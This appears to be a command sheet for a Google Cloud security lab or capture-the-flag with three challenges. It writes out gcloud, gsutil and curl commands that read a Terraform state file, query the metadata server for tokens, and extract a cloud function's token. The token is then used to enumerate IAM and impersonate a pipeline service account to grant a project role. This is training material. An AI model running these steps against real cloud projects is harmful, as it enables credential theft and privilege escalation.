# Commands

<details>
  <summary>***** Challenge 1 *****</summary>

## Challenge 1

read state file
#####
    gsutil cat gs://file-uploads-$PROJECT_ID/default.tfstate

  <details>
    <summary>Walkthrough Challenge 1</summary>
    
  ssh into vm
  #####
    ssh -i <private key file> alice@<compute instance IP> 

  </details>

</details>

#

<details>
  <summary>***** Challenge 2 *****</summary>

## Challenge 2

show VM service account
#####
    gcloud auth list

background: metadata server
#####
    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"

demonstrate limited access scopes
#####
    gcloud compute instances list

show access scopes from tokeninfo endpoint
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)

list storage buckets from VM
#####
    gsutil ls

  <details>
    <summary>Walkthrough Challenge 2</summary>

  list function source code bucket
  #####
      gsutil ls gs://cloud-function-bucket-challenge4

  read source code
  #####
      gsutil cat gs://cloud-function-bucket-challenge4/main.py

  execute function invocation script
  #####
      ./invoke_monitoring_function.sh

  extract command to get function token
  #####
    curl -s -X POST https://$LOCATION-$PROJECT_ID.cloudfunctions.net/monitoring-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'

  save the new token in env var and check access scopes
  #####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$TOKEN
    
  </details>

</details>

#

<details>
  <summary>***** Challenge 3 *****</summary>

## Challenge 3

set token as env var
#####
     export CLOUDSDK_AUTH_ACCESS_TOKEN=<function token>

Get project permissions
#####
    gcloud projects get-iam-policy $PROJECT_ID

List the other service accounts on this project:
#####
    gcloud iam service-accounts list

Describe role
#####
    gcloud iam roles describe TerraformPipelineProjectAdmin --project $PROJECT_ID

Describe bindings on SA
#####
    gcloud iam service-accounts get-iam-policy <terraform service account>

  <details>
    <summary>Walkthrough Challenge 3</summary>
  
  impersonate and set binding
  #####
    gcloud projects add-iam-policy-binding $PROJECT_ID --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>
  
  </details>

</details>
